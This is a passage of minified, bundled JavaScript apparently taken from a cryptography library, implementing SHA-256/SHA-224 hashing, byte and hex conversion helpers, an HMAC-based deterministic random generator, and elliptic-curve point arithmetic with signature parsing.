          Sq: () => Lr,
          Vi: () => Or,
        });
        var r = {};
        function i(e) {
          if (!Number.isSafeInteger(e) || e < 0)
            throw new Error(`Wrong positive integer: ${e}`);
        }
        function o(e) {
          if (!(e instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
          for (
            var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
            r < t;
            r++
          )
            n[r - 1] = arguments[r];
          if (n.length > 0 && !n.includes(e.length))
            throw new TypeError(
              `Expected Uint8Array of length ${n}, not of length=${e.length}`
            );
        }
        n.r(r),
          n.d(r, {
            dQ: () => $,
            ci: () => C,
            bytesToNumberBE: () => B,
            ty: () => P,
            eV: () => R,
            n$: () => M,
            ql: () => N,
            hexToBytes: () => O,
            tL: () => _,
            S5: () => U,
            iY: () => L,
            FF: () => j,
          });
        const s = {
            number: i,
            bool: function (e) {
              if ("boolean" !== typeof e)
                throw new Error(`Expected boolean, not ${e}`);
            },
            bytes: o,
            hash: function (e) {
              if ("function" !== typeof e || "function" !== typeof e.create)
                throw new Error(
                  "Hash should be wrapped by utils.wrapConstructor"
                );
              i(e.outputLen), i(e.blockLen);
            },
            exists: function (e) {
              let t =
                !(arguments.length > 1 && void 0 !== arguments[1]) ||
                arguments[1];
              if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
              if (t && e.finished)
                throw new Error("Hash#digest() has already been called");
            },
            output: function (e, t) {
              o(e);
              const n = t.outputLen;
              if (e.length < n)
                throw new Error(
                  `digestInto() expects output buffer of length at least ${n}`
                );
            },
          },
          a = s,
          l = {
            node: void 0,
            web:
              "object" === typeof self && "crypto" in self
                ? self.crypto
                : void 0,
          },
          c = (e) => new DataView(e.buffer, e.byteOffset, e.byteLength),
          u = (e, t) => (e << (32 - t)) | (e >>> t);
        if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0]))
          throw new Error("Non little-endian hardware is not supported");
        Array.from({ length: 256 }, (e, t) => t.toString(16).padStart(2, "0"));
        function f(e) {
          if (
            ("string" === typeof e &&
              (e = (function (e) {
                if ("string" !== typeof e)
                  throw new TypeError(
                    "utf8ToBytes expected string, got " + typeof e
                  );
                return new TextEncoder().encode(e);
              })(e)),
            !(e instanceof Uint8Array))
          )
            throw new TypeError(
              `Expected input type is Uint8Array (got ${typeof e})`
            );
          return e;
        }
        class h {
          clone() {
            return this._cloneInto();
          }
        }
        function d(e) {
          const t = (t) => e().update(f(t)).digest(),
            n = e();
          return (
            (t.outputLen = n.outputLen),
            (t.blockLen = n.blockLen),
            (t.create = () => e()),
            t
          );
        }
        function p() {
          let e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
          if (l.web) return l.web.getRandomValues(new Uint8Array(e));
          if (l.node) return new Uint8Array(l.node.randomBytes(e).buffer);
          throw new Error("The environment doesn't have randomBytes function");
        }
        class g extends h {
          constructor(e, t, n, r) {
            super(),
              (this.blockLen = e),
              (this.outputLen = t),
              (this.padOffset = n),
              (this.isLE = r),
              (this.finished = !1),
              (this.length = 0),
              (this.pos = 0),
              (this.destroyed = !1),
              (this.buffer = new Uint8Array(e)),
              (this.view = c(this.buffer));
          }
          update(e) {
            a.exists(this);
            const { view: t, buffer: n, blockLen: r } = this,
              i = (e = f(e)).length;
            for (let o = 0; o < i; ) {
              const s = Math.min(r - this.pos, i - o);
              if (s !== r)
                n.set(e.subarray(o, o + s), this.pos),
                  (this.pos += s),
                  (o += s),
                  this.pos === r && (this.process(t, 0), (this.pos = 0));
              else {
                const t = c(e);
                for (; r <= i - o; o += r) this.process(t, o);
              }
            }
            return (this.length += e.length), this.roundClean(), this;
          }
          digestInto(e) {
            a.exists(this), a.output(e, this), (this.finished = !0);
            const { buffer: t, view: n, blockLen: r, isLE: i } = this;
            let { pos: o } = this;
            (t[o++] = 128),
              this.buffer.subarray(o).fill(0),
              this.padOffset > r - o && (this.process(n, 0), (o = 0));
            for (let a = o; a < r; a++) t[a] = 0;
            !(function (e, t, n, r) {
              if ("function" === typeof e.setBigUint64)
                return e.setBigUint64(t, n, r);
              const i = BigInt(32),
                o = BigInt(4294967295),
                s = Number((n >> i) & o),
                a = Number(n & o),
                l = r ? 4 : 0,
                c = r ? 0 : 4;
              e.setUint32(t + l, s, r), e.setUint32(t + c, a, r);
            })(n, r - 8, BigInt(8 * this.length), i),
              this.process(n, 0);
            const s = c(e),
              l = this.outputLen;
            if (l % 4)
              throw new Error("_sha2: outputLen should be aligned to 32bit");
            const u = l / 4,
              f = this.get();
            if (u > f.length)
              throw new Error("_sha2: outputLen bigger than state");
            for (let a = 0; a < u; a++) s.setUint32(4 * a, f[a], i);
          }
          digest() {
            const { buffer: e, outputLen: t } = this;
            this.digestInto(e);
            const n = e.slice(0, t);
            return this.destroy(), n;
          }
          _cloneInto(e) {
            e || (e = new this.constructor()), e.set(...this.get());
            const {
              blockLen: t,
              buffer: n,
              length: r,
              finished: i,
              destroyed: o,
              pos: s,
            } = this;
            return (
              (e.length = r),
              (e.pos = s),
              (e.finished = i),
              (e.destroyed = o),
              r % t && e.buffer.set(n),
              e
            );
          }
        }
        const y = (e, t, n) => (e & t) ^ (e & n) ^ (t & n),
          w = new Uint32Array([
            1116352408, 1899447441, 3049323471, 3921009573, 961987163,
            1508970993, 2453635748, 2870763221, 3624381080, 310598401,
            607225278, 1426881987, 1925078388, 2162078206, 2614888103,
            3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983,
            1249150122, 1555081692, 1996064986, 2554220882, 2821834349,
            2952996808, 3210313671, 3336571891, 3584528711, 113926993,
            338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700,
            1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
            3259730800, 3345764771, 3516065817, 3600352804, 4094571909,
            275423344, 430227734, 506948616, 659060556, 883997877, 958139571,
            1322822218, 1537002063, 1747873779, 1955562222, 2024104815,
            2227730452, 2361852424, 2428436474, 2756734187, 3204031479,
            3329325298,
          ]),
          m = new Uint32Array([
            1779033703, 3144134277, 1013904242, 2773480762, 1359893119,
            2600822924, 528734635, 1541459225,
          ]),
          b = new Uint32Array(64);
        class v extends g {
          constructor() {
            super(64, 32, 8, !1),
              (this.A = 0 | m[0]),
              (this.B = 0 | m[1]),
              (this.C = 0 | m[2]),
              (this.D = 0 | m[3]),
              (this.E = 0 | m[4]),
              (this.F = 0 | m[5]),
              (this.G = 0 | m[6]),
              (this.H = 0 | m[7]);
          }
          get() {
            const { A: e, B: t, C: n, D: r, E: i, F: o, G: s, H: a } = this;
            return [e, t, n, r, i, o, s, a];
          }
          set(e, t, n, r, i, o, s, a) {
            (this.A = 0 | e),
              (this.B = 0 | t),
              (this.C = 0 | n),
              (this.D = 0 | r),
              (this.E = 0 | i),
              (this.F = 0 | o),
              (this.G = 0 | s),
              (this.H = 0 | a);
          }
          process(e, t) {
            for (let u = 0; u < 16; u++, t += 4) b[u] = e.getUint32(t, !1);
            for (let h = 16; h < 64; h++) {
              const e = b[h - 15],
                t = b[h - 2],
                n = u(e, 7) ^ u(e, 18) ^ (e >>> 3),
                r = u(t, 17) ^ u(t, 19) ^ (t >>> 10);
              b[h] = (r + b[h - 7] + n + b[h - 16]) | 0;
            }
            let { A: n, B: r, C: i, D: o, E: s, F: a, G: l, H: c } = this;
            for (let h = 0; h < 64; h++) {
              const e =
                  (c +
                    (u(s, 6) ^ u(s, 11) ^ u(s, 25)) +
                    (((f = s) & a) ^ (~f & l)) +
                    w[h] +
                    b[h]) |
                  0,
                t = ((u(n, 2) ^ u(n, 13) ^ u(n, 22)) + y(n, r, i)) | 0;
              (c = l),
                (l = a),
                (a = s),
                (s = (o + e) | 0),
                (o = i),
                (i = r),
                (r = n),
                (n = (e + t) | 0);
            }
            var f;
            (n = (n + this.A) | 0),
              (r = (r + this.B) | 0),
              (i = (i + this.C) | 0),
              (o = (o + this.D) | 0),
              (s = (s + this.E) | 0),
              (a = (a + this.F) | 0),
              (l = (l + this.G) | 0),
              (c = (c + this.H) | 0),
              this.set(n, r, i, o, s, a, l, c);
          }
          roundClean() {
            b.fill(0);
          }
          destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
          }
        }
        class E extends v {
          constructor() {
            super(),
              (this.A = -1056596264),
              (this.B = 914150663),
              (this.C = 812702999),
              (this.D = -150054599),
              (this.E = -4191439),
              (this.F = 1750603025),
              (this.G = 1694076839),
              (this.H = -1090891868),
              (this.outputLen = 28);
          }
        }
        const S = d(() => new v()),
          x = (d(() => new E()), BigInt(0), BigInt(1)),
          A = BigInt(2),
          k = (e) => e instanceof Uint8Array,
          T = Array.from({ length: 256 }, (e, t) =>
            t.toString(16).padStart(2, "0")
          );
        function C(e) {
          if (!k(e)) throw new Error("Uint8Array expected");
          let t = "";
          for (let n = 0; n < e.length; n++) t += T[e[n]];
          return t;
        }
        function I(e) {
          if ("string" !== typeof e)
            throw new Error("hex string expected, got " + typeof e);
          return BigInt("" === e ? "0" : `0x${e}`);
        }
        function O(e) {
          if ("string" !== typeof e)
            throw new Error("hex string expected, got " + typeof e);
          if (e.length % 2)
            throw new Error("hex string is invalid: unpadded " + e.length);
          const t = new Uint8Array(e.length / 2);
          for (let n = 0; n < t.length; n++) {
            const r = 2 * n,
              i = e.slice(r, r + 2),
              o = Number.parseInt(i, 16);
            if (Number.isNaN(o) || o < 0)
              throw new Error("invalid byte sequence");
            t[n] = o;
          }
          return t;
        }
        function B(e) {
          return I(C(e));
        }
        function P(e) {
          if (!k(e)) throw new Error("Uint8Array expected");
          return I(C(Uint8Array.from(e).reverse()));
        }
        const _ = (e, t) => O(e.toString(16).padStart(2 * t, "0")),
          U = (e, t) => _(e, t).reverse();
        function N(e, t, n) {
          let r;
          if ("string" === typeof t)
            try {
              r = O(t);
            } catch (o) {
              throw new Error(
                `${e} must be valid hex string, got "${t}". Cause: ${o}`
              );
            }
          else {
            if (!k(t)) throw new Error(`${e} must be hex string or Uint8Array`);
            r = Uint8Array.from(t);
          }
          const i = r.length;
          if ("number" === typeof n && i !== n)
            throw new Error(`${e} expected ${n} bytes, got ${i}`);
          return r;
        }
        function R() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          const r = new Uint8Array(t.reduce((e, t) => e + t.length, 0));
          let i = 0;
          return (
            t.forEach((e) => {
              if (!k(e)) throw new Error("Uint8Array expected");
              r.set(e, i), (i += e.length);
            }),
            r
          );
        }
        function L(e) {
          if ("string" !== typeof e)
            throw new Error("utf8ToBytes expected string, got " + typeof e);
          return new TextEncoder().encode(e);
        }
        const $ = (e) => (A << BigInt(e - 1)) - x,
          H = (e) => new Uint8Array(e),
          D = (e) => Uint8Array.from(e);
        function M(e, t, n) {
          if ("number" !== typeof e || e < 2)
            throw new Error("hashLen must be a number");
          if ("number" !== typeof t || t < 2)
            throw new Error("qByteLen must be a number");
          if ("function" !== typeof n)
            throw new Error("hmacFn must be a function");
          let r = H(e),
            i = H(e),
            o = 0;
          const s = () => {
              r.fill(1), i.fill(0), (o = 0);
            },
            a = function () {
              for (
                var e = arguments.length, t = new Array(e), o = 0;
                o < e;
                o++
              )
                t[o] = arguments[o];
              return n(i, r, ...t);
            },
            l = function () {
              let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : H();
              (i = a(D([0]), e)),
                (r = a()),
                0 !== e.length && ((i = a(D([1]), e)), (r = a()));
            },
            c = () => {
              if (o++ >= 1e3) throw new Error("drbg: tried 1000 values");
              let e = 0;
              const n = [];
              for (; e < t; ) {
                r = a();
                const t = r.slice();
                n.push(t), (e += r.length);
              }
              return R(...n);
            };
          return (e, t) => {
            let n;
            for (s(), l(e); !(n = t(c())); ) l();
            return s(), n;
          };
        }
        const F = {
          bigint: (e) => "bigint" === typeof e,
          function: (e) => "function" === typeof e,
          boolean: (e) => "boolean" === typeof e,
          string: (e) => "string" === typeof e,
          isSafeInteger: (e) => Number.isSafeInteger(e),
          array: (e) => Array.isArray(e),
          field: (e, t) => t.Fp.isValid(e),
          hash: (e) =>
            "function" === typeof e && Number.isSafeInteger(e.outputLen),
        };
        function j(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
          const r = (t, n, r) => {
            const i = F[n];
            if ("function" !== typeof i)
              throw new Error(`Invalid validator "${n}", expected function`);
            const o = e[t];
            if ((!r || void 0 !== o) && !i(o, e))
              throw new Error(
                `Invalid param ${String(t)}=${o} (${typeof o}), expected ${n}`
              );
          };
          for (const [i, o] of Object.entries(t)) r(i, o, !1);
          for (const [i, o] of Object.entries(n)) r(i, o, !0);
          return e;
        }
        const z = BigInt(0),
          K = BigInt(1),
          W = BigInt(2),
          V = BigInt(3),
          q = BigInt(4),
          G = BigInt(5),
          Y = BigInt(8);
        BigInt(9), BigInt(16);
        function Z(e, t) {
          const n = e % t;
          return n >= z ? n : t + n;
        }
        function J(e, t, n) {
          if (n <= z || t < z) throw new Error("Expected power/modulo > 0");
          if (n === K) return z;
          let r = K;
          for (; t > z; )
            t & K && (r = (r * e) % n), (e = (e * e) % n), (t >>= K);
          return r;
        }
        function X(e, t, n) {
          let r = e;
          for (; t-- > z; ) (r *= r), (r %= n);
          return r;
        }
        function Q(e, t) {
          if (e === z || t <= z)
            throw new Error(
              `invert: expected positive integers, got n=${e} mod=${t}`
            );
          let n = Z(e, t),
            r = t,
            i = z,
            o = K,
            s = K,
            a = z;
          for (; n !== z; ) {
            const e = r / n,
              t = r % n,
              l = i - s * e,
              c = o - a * e;
            (r = n), (n = t), (i = s), (o = a), (s = l), (a = c);
          }
          if (r !== K) throw new Error("invert: does not exist");
          return Z(i, t);
        }
        function ee(e) {
          if (e % q === V) {
            const t = (e + K) / q;
            return function (e, n) {
              const r = e.pow(n, t);
              if (!e.eql(e.sqr(r), n))
                throw new Error("Cannot find square root");
              return r;
            };
          }
          if (e % Y === G) {
            const t = (e - G) / Y;
            return function (e, n) {
              const r = e.mul(n, W),
                i = e.pow(r, t),
                o = e.mul(n, i),
                s = e.mul(e.mul(o, W), i),
                a = e.mul(o, e.sub(s, e.ONE));
              if (!e.eql(e.sqr(a), n))
                throw new Error("Cannot find square root");
              return a;
            };
          }
          return (function (e) {
            const t = (e - K) / W;
            let n, r, i;
            for (n = e - K, r = 0; n % W === z; n /= W, r++);
            for (i = W; i < e && J(i, t, e) !== e - K; i++);
            if (1 === r) {
              const t = (e + K) / q;
              return function (e, n) {
                const r = e.pow(n, t);
                if (!e.eql(e.sqr(r), n))
                  throw new Error("Cannot find square root");
                return r;
              };
            }
            const o = (n + K) / W;
            return function (e, s) {
              if (e.pow(s, t) === e.neg(e.ONE))
                throw new Error("Cannot find square root");
              let a = r,
                l = e.pow(e.mul(e.ONE, i), n),
                c = e.pow(s, o),
                u = e.pow(s, n);
              for (; !e.eql(u, e.ONE); ) {
                if (e.eql(u, e.ZERO)) return e.ZERO;
                let t = 1;
                for (let r = e.sqr(u); t < a && !e.eql(r, e.ONE); t++)
                  r = e.sqr(r);
                const n = e.pow(l, K << BigInt(a - t - 1));
                (l = e.sqr(n)), (c = e.mul(c, n)), (u = e.mul(u, l)), (a = t);
              }
              return c;
            };
          })(e);
        }
        const te = [
          "create",
          "isValid",
          "is0",
          "neg",
          "inv",
          "sqrt",
          "sqr",
          "eql",
          "add",
          "sub",
          "mul",
          "pow",
          "div",
          "addN",
          "subN",
          "mulN",
          "sqrN",
        ];
        function ne(e) {
          const t = te.reduce((e, t) => ((e[t] = "function"), e), {
            ORDER: "bigint",
            MASK: "bigint",
            BYTES: "isSafeInteger",
            BITS: "isSafeInteger",
          });
          return j(e, t);
        }
        function re(e, t) {
          const n = void 0 !== t ? t : e.toString(2).length;
          return { nBitLength: n, nByteLength: Math.ceil(n / 8) };
        }
        const ie = BigInt(0),
          oe = BigInt(1);
        function se(e) {
          return (
            ne(e.Fp),
            j(
              e,
              { n: "bigint", h: "bigint", Gx: "field", Gy: "field" },
              { nBitLength: "isSafeInteger", nByteLength: "isSafeInteger" }
            ),
            Object.freeze({ ...re(e.n, e.nBitLength), ...e })
          );
        }
        const { bytesToNumberBE: ae, hexToBytes: le } = r,
          ce = {
            Err: class extends Error {
              constructor() {
                super(
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : ""
                );
              }
            },
            _parseInt(e) {
              const { Err: t } = ce;
              if (e.length < 2 || 2 !== e[0])
                throw new t("Invalid signature integer tag");
              const n = e[1],
                r = e.subarray(2, n + 2);
              if (!n || r.length !== n)
                throw new t("Invalid signature integer: wrong length");
              if (0 === r[0] && r[1] <= 127)
                throw new t("Invalid signature integer: trailing length");
              return { d: ae(r), l: e.subarray(n + 2) };
            },
            toSig(e) {
              const { Err: t } = ce,
                n = "string" === typeof e ? le(e) : e;
              if (!(n instanceof Uint8Array)) throw new Error("ui8a expected");
              let r = n.length;
              if (r < 2 || 48 != n[0]) throw new t("Invalid signature tag");
              if (n[1] !== r - 2)
                throw new t("Invalid signature: incorrect length");
              const { d: i, l: o } = ce._parseInt(n.subarray(2)),
                { d: s, l: a } = ce._parseInt(o);
              if (a.length)
                throw new t("Invalid signature: left bytes after parsing");
              return { r: i, s: s };
            },
            hexFromSig(e) {
              const t = (e) => (Number.parseInt(e[0], 16) >= 8 ? "00" + e : e),
                n = (e) => {
                  const t = e.toString(16);
                  return 1 & t.length ? `0${t}` : t;
                },
                r = t(n(e.s)),
                i = t(n(e.r)),
                o = r.length / 2,
                s = i.length / 2,
                a = n(o),
                l = n(s);
              return `30${n(s + o + 4)}02${l}${i}02${a}${r}`;
            },
          },
          ue = BigInt(0),
          fe = BigInt(1);
        function he(e) {
          const t = (function (e) {
              const t = se(e);
              j(
                t,
                {
                  a: "field",
                  b: "field",
                  fromBytes: "function",
                  toBytes: "function",
                },
                {
                  allowedPrivateKeyLengths: "array",
                  wrapPrivateKey: "boolean",
                  isTorsionFree: "function",
                  clearCofactor: "function",
                  allowInfinityPoint: "boolean",
                }
              );
              const { endo: n, Fp: r, a: i } = t;
              if (n) {
                if (!r.eql(i, r.ZERO))
                  throw new Error(
                    "Endomorphism can only be defined for Koblitz curves that have a=0"
                  );
                if (
                  "object" !== typeof n ||
                  "bigint" !== typeof n.beta ||
                  "function" !== typeof n.splitScalar
                )
                  throw new Error(
                    "Expected endomorphism with beta: bigint and splitScalar: function"
                  );
              }
              return Object.freeze({ ...t });
            })(e),
            { Fp: n } = t;
          function r(e) {
            const { a: r, b: i } = t,
              o = n.sqr(e),
              s = n.mul(o, e);
            return n.add(n.add(s, n.mul(e, r)), i);
          }
          function i(e) {
            return "bigint" === typeof e && ue < e && e < t.n;
          }
          function o(e) {
            if (!i(e))
              throw new Error("Expected valid bigint: 0 < bigint < curve.n");
          }
          function s(e) {
            const {
              allowedPrivateKeyLengths: n,
              nByteLength: r,
              wrapPrivateKey: i,
              n: s,
            } = t;
            if (n && "bigint" !== typeof e) {
              if (
                (e instanceof Uint8Array && (e = C(e)),
                "string" !== typeof e || !n.includes(e.length))
              )
                throw new Error("Invalid key");
              e = e.padStart(2 * r, "0");
            }
            let a;
            try {
              a = "bigint" === typeof e ? e : B(N("private key", e, r));
            } catch (l) {
              throw new Error(
                `private key must be ${r} bytes, hex or bigint, not ${typeof e}`
              );
            }
            return i && (a = Z(a, s)), o(a), a;
          }
          const a = new Map();
          function l(e) {
            if (!(e instanceof c)) throw new Error("ProjectivePoint expected");
          }
          class c {
            constructor(e, t, r) {
              if (
                ((this.px = e),
                (this.py = t),
                (this.pz = r),
                null == e || !n.isValid(e))
              )
                throw new Error("x required");
              if (null == t || !n.isValid(t)) throw new Error("y required");
              if (null == r || !n.isValid(r)) throw new Error("z required");
            }
            static fromAffine(e) {
              const { x: t, y: r } = e || {};
              if (!e || !n.isValid(t) || !n.isValid(r))
                throw new Error("invalid affine point");
              if (e instanceof c)
                throw new Error("projective point not allowed");
              const i = (e) => n.eql(e, n.ZERO);
              return i(t) && i(r) ? c.ZERO : new c(t, r, n.ONE);
            }
            get x() {
              return this.toAffine().x;
            }
            get y() {
              return this.toAffine().y;
            }
            static normalizeZ(e) {
              const t = n.invertBatch(e.map((e) => e.pz));
              return e.map((e, n) => e.toAffine(t[n])).map(c.fromAffine);
            }
            static fromHex(e) {
              const n = c.fromAffine(t.fromBytes(N("pointHex", e)));
              return n.assertValidity(), n;
            }
            static fromPrivateKey(e) {
              return c.BASE.multiply(s(e));
            }
            _setWindowSize(e) {
              (this._WINDOW_SIZE = e), a.delete(this);
            }
            assertValidity() {
              if (this.is0()) {
                if (t.allowInfinityPoint) return;
                throw new Error("bad point: ZERO");
              }
              const { x: e, y: i } = this.toAffine();
              if (!n.isValid(e) || !n.isValid(i))
                throw new Error("bad point: x or y not FE");
              const o = n.sqr(i),
                s = r(e);
              if (!n.eql(o, s))
                throw new Error("bad point: equation left != right");
              if (!this.isTorsionFree())
                throw new Error("bad point: not in prime-order subgroup");
            }
            hasEvenY() {
              const { y: e } = this.toAffine();
              if (n.isOdd) return !n.isOdd(e);
              throw new Error("Field doesn't support isOdd");
            }
            equals(e) {
              l(e);
              const { px: t, py: r, pz: i } = this,
                { px: o, py: s, pz: a } = e,
                c = n.eql(n.mul(t, a), n.mul(o, i)),
                u = n.eql(n.mul(r, a), n.mul(s, i));
              return c && u;
            }
            negate() {
              return new c(this.px, n.neg(this.py), this.pz);
            }
            double() {
              const { a: e, b: r } = t,
                i = n.mul(r, 3n),
                { px: o, py: s, pz: a } = this;
              let l = n.ZERO,
                u = n.ZERO,
                f = n.ZERO,
                h = n.mul(o, o),
                d = n.mul(s, s),
                p = n.mul(a, a),
                g = n.mul(o, s);
              return (
                (g = n.add(g, g)),
                (f = n.mul(o, a)),
                (f = n.add(f, f)),
                (l = n.mul(e, f)),
                (u = n.mul(i, p)),
                (u = n.add(l, u)),
                (l = n.sub(d, u)),
                (u = n.add(d, u)),
                (u = n.mul(l, u)),
                (l = n.mul(g, l)),
                (f = n.mul(i, f)),
                (p = n.mul(e, p)),
                (g = n.sub(h, p)),
                (g = n.mul(e, g)),
                (g = n.add(g, f)),
                (f = n.add(h, h)),
                (h = n.add(f, h)),
                (h = n.add(h, p)),
                (h = n.mul(h, g)),
                (u = n.add(u, h)),
                (p = n.mul(s, a)),
                (p = n.add(p, p)),
                (h = n.mul(p, g)),
                (l = n.sub(l, h)),
                (f = n.mul(p, d)),
                (f = n.add(f, f)),
                (f = n.add(f, f)),
                new c(l, u, f)
              );
            }
            add(e) {
              l(e);
              const { px: r, py: i, pz: o } = this,
                { px: s, py: a, pz: u } = e;
              let f = n.ZERO,
                h = n.ZERO,
                d = n.ZERO;
              const p = t.a,
                g = n.mul(t.b, 3n);
              let y = n.mul(r, s),
                w = n.mul(i, a),
                m = n.mul(o, u),
                b = n.add(r, i),
                v = n.add(s, a);
              (b = n.mul(b, v)),
                (v = n.add(y, w)),
                (b = n.sub(b, v)),
                (v = n.add(r, o));
              let E = n.add(s, u);
              return (
                (v = n.mul(v, E)),
                (E = n.add(y, m)),
                (v = n.sub(v, E)),
                (E = n.add(i, o)),
                (f = n.add(a, u)),
                (E = n.mul(E, f)),
                (f = n.add(w, m)),
                (E = n.sub(E, f)),
                (d = n.mul(p, v)),
                (f = n.mul(g, m)),
                (d = n.add(f, d)),
                (f = n.sub(w, d)),
                (d = n.add(w, d)),
                (h = n.mul(f, d)),
                (w = n.add(y, y)),
                (w = n.add(w, y)),
                (m = n.mul(p, m)),
                (v = n.mul(g, v)),
                (w = n.add(w, m)),
                (m = n.sub(y, m)),
                (m = n.mul(p, m)),
                (v = n.add(v, m)),
                (y = n.mul(w, v)),
                (h = n.add(h, y)),
                (y = n.mul(E, v)),
                (f = n.mul(b, f)),
                (f = n.sub(f, y)),
                (y = n.mul(b, w)),
                (d = n.mul(E, d)),
                (d = n.add(d, y)),
                new c(f, h, d)
              );
            }
            subtract(e) {
              return this.add(e.negate());
            }
            is0() {
              return this.equals(c.ZERO);
            }
            wNAF(e) {
              return f.wNAFCached(this, a, e, (e) => {
                const t = n.invertBatch(e.map((e) => e.pz));
                return e.map((e, n) => e.toAffine(t[n])).map(c.fromAffine);
              });
            }
            multiplyUnsafe(e) {
              const r = c.ZERO;
              if (e === ue) return r;
              if ((o(e), e === fe)) return this;
              const { endo: i } = t;
              if (!i) return f.unsafeLadder(this, e);
              let { k1neg: s, k1: a, k2neg: l, k2: u } = i.splitScalar(e),
                h = r,
                d = r,
                p = this;
              for (; a > ue || u > ue; )
                a & fe && (h = h.add(p)),
                  u & fe && (d = d.add(p)),
                  (p = p.double()),
                  (a >>= fe),
                  (u >>= fe);
              return (
                s && (h = h.negate()),
                l && (d = d.negate()),
                (d = new c(n.mul(d.px, i.beta), d.py, d.pz)),
                h.add(d)
              );
            }
            multiply(e) {
              o(e);
              let r,
                i,
                s = e;
              const { endo: a } = t;
              if (a) {
                const { k1neg: e, k1: t, k2neg: o, k2: l } = a.splitScalar(s);
                let { p: u, f: h } = this.wNAF(t),
                  { p: d, f: p } = this.wNAF(l);
                (u = f.constTimeNegate(e, u)),
                  (d = f.constTimeNegate(o, d)),
                  (d = new c(n.mul(d.px, a.beta), d.py, d.pz)),
                  (r = u.add(d)),
                  (i = h.add(p));
              } else {
                const { p: e, f: t } = this.wNAF(s);
                (r = e), (i = t);
              }
              return c.normalizeZ([r, i])[0];
            }
            multiplyAndAddUnsafe(e, t, n) {
              const r = c.BASE,
                i = (e, t) =>
                  t !== ue && t !== fe && e.equals(r)
                    ? e.multiply(t)
                    : e.multiplyUnsafe(t),
                o = i(this, t).add(i(e, n));
              return o.is0() ? void 0 : o;
            }
            toAffine(e) {
              const { px: t, py: r, pz: i } = this,
                o = this.is0();
              null == e && (e = o ? n.ONE : n.inv(i));
              const s = n.mul(t, e),
                a = n.mul(r, e),
                l = n.mul(i, e);
              if (o) return { x: n.ZERO, y: n.ZERO };
              if (!n.eql(l, n.ONE)) throw new Error("invZ was invalid");
              return { x: s, y: a };
            }
            isTorsionFree() {
              const { h: e, isTorsionFree: n } = t;
              if (e === fe) return !0;
              if (n) return n(c, this);
              throw new Error(
                "isTorsionFree() has not been declared for the elliptic curve"
              );
            }
            clearCofactor() {
              const { h: e, clearCofactor: n } = t;
              return e === fe
                ? this
                : n
                ? n(c, this)
                : this.multiplyUnsafe(t.h);
            }
            toRawBytes() {
              let e =
                !(arguments.length > 0 && void 0 !== arguments[0]) ||
                arguments[0];
              return this.assertValidity(), t.toBytes(c, this, e);
            }
            toHex() {
              let e =
                !(arguments.length > 0 && void 0 !== arguments[0]) ||
                arguments[0];
              return C(this.toRawBytes(e));
            }
          }
          (c.BASE = new c(t.Gx, t.Gy, n.ONE)),
            (c.ZERO = new c(n.ZERO, n.ONE, n.ZERO));
          const u = t.nBitLength,
            f = (function (e, t) {
              const n = (e, t) => {
                  const n = t.negate();
                  return e ? n : t;
                },
                r = (e) => ({
                  windows: Math.ceil(t / e) + 1,
                  windowSize: 2 ** (e - 1),
                });
              return {
                constTimeNegate: n,
                unsafeLadder(t, n) {
                  let r = e.ZERO,
                    i = t;
                  for (; n > ie; )
                    n & oe && (r = r.add(i)), (i = i.double()), (n >>= oe);
                  return r;
                },
                precomputeWindow(e, t) {
                  const { windows: n, windowSize: i } = r(t),
                    o = [];
                  let s = e,
                    a = s;
                  for (let r = 0; r < n; r++) {
                    (a = s), o.push(a);
                    for (let e = 1; e < i; e++) (a = a.add(s)), o.push(a);
                    s = a.double();
                  }
                  return o;
                },
                wNAF(t, i, o) {
                  const { windows: s, windowSize: a } = r(t);
                  let l = e.ZERO,
                    c = e.BASE;
                  const u = BigInt(2 ** t - 1),
                    f = 2 ** t,
                    h = BigInt(t);
                  for (let e = 0; e < s; e++) {
                    const t = e * a;
                    let r = Number(o & u);
                    (o >>= h), r > a && ((r -= f), (o += oe));
                    const s = t,
                      d = t + Math.abs(r) - 1,
                      p = e % 2 !== 0,
                      g = r < 0;
                    0 === r ? (c = c.add(n(p, i[s]))) : (l = l.add(n(g, i[d])));
                  }
                  return { p: l, f: c };
                },
                wNAFCached(e, t, n, r) {
                  const i = e._WINDOW_SIZE || 1;
                  let o = t.get(e);
                  return (
                    o ||
                      ((o = this.precomputeWindow(e, i)),
                      1 !== i && t.set(e, r(o))),
                    this.wNAF(i, o, n)
                  );
                },
              };
            })(c, t.endo ? Math.ceil(u / 2) : u);
          return {
            ProjectivePoint: c,
            normPrivateKeyToScalar: s,
            weierstrassEquation: r,
            isWithinCurveOrder: i,
          };
        }
        function de(e) {
          const t = (function (e) {
              const t = se(e);
              return (
                j(
                  t,
                  { hash: "hash", hmac: "function", randomBytes: "function" },
                  {
                    bits2int: "function",
                    bits2int_modN: "function",
                    lowS: "boolean",
                  }
                ),
                Object.freeze({ lowS: !0, ...t })
              );
            })(e),
            n = t.n,
            r = t.Fp,
            i = r.BYTES + 1,
            o = 2 * r.BYTES + 1;
          function s(e) {
            return Z(e, n);
          }
          function a(e) {
            return Q(e, n);
          }
          const {
              ProjectivePoint: l,
              normPrivateKeyToScalar: c,
              weierstrassEquation: u,
              isWithinCurveOrder: f,
            } = he({
              ...t,
              toBytes(e, t, n) {
                const i = t.toAffine(),
                  o = r.toBytes(i.x),
                  s = R;
                return n
                  ? s(Uint8Array.from([t.hasEvenY() ? 2 : 3]), o)
                  : s(Uint8Array.from([4]), o, r.toBytes(i.y));
              },
              fromBytes(e) {
                const t = e.length,
                  n = e[0],
                  s = e.subarray(1);
                if (t !== i || (2 !== n && 3 !== n)) {
                  if (t === o && 4 === n) {
                    return {
                      x: r.fromBytes(s.subarray(0, r.BYTES)),
                      y: r.fromBytes(s.subarray(r.BYTES, 2 * r.BYTES)),
                    };
                  }
                  throw new Error(
